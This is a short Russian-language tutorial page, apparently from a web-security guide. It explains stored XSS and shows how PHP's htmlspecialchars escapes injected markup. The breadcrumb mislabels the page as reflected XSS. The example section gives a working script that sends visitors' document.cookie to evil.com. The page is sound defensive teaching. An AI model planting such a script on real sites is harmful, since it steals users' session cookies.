> [Главная](../index.md)  /  [XSS](index.md) / Отражённые XSS

### <a id="about"></a> [Что такое  хранимые XSS](#about)
Суть хранимой XSS заключается в том, что бэкэнд сохраняет на сервере необработанные данные полученные от пользователя и в дальнейшем не обрабатывает их.
Таким образом вредоносный html\JavaScript код сохраняется на веб сервере и в дальнейшем обрабатывается браузерами пользователей.

### <a id='example'></a> [Пример уязвимости](#example)
Злоумышленник опубликовал запись в на крупном ресурсе в которой встроили js который отправляет на его сервер куки пользователя.
```html
<script>
	var img = document.createElement('img');
	img.src = 'http://evil.com/cookies?data'+encodeURI(document.cookie);
	document.body.appendChild(img);
</script>
```
Таким образом злоумышленник получит кукисы всех пользователей которые увидят его запись.
Все просто.


### <a id="protection"></a> [Защита](#protection)
Необходимо всегда фильтровать данные полученные из вне. 
В php есть замечательная функция [htmlspecialchars](http://php.net/manual/ru/function.htmlspecialchars.php) которая поможет спастись от xss атак.
> htmlspecialchars — Преобразует специальные символы в HTML-сущности
> Производятся следующие преобразования:
> '&' (амперсанд) преобразуется в '&amp;'
> '"' (двойная кавычка) преобразуется в '&quot;' в режиме ENT_NOQUOTES is not set.
> "'" (одиночная кавычка) преобразуется в '&#039;' (или &apos;) только в режиме ENT_QUOTES.
> '<' (знак "меньше чем") преобразуется в '&lt;'
> '>' (знак "больше чем") преобразуется в '&gt;'

Таким образом, при использовании функции `htmlspecialchars` приведенный выше код будет преобразован в 
```html
&lt;script&gt;
	var img = document.createElement('img');
	img.src = 'http://evil.com/cookies?data'+encodeURI(document.cookie);
	document.body.appendChild(img);
&lt;/script&gt;
```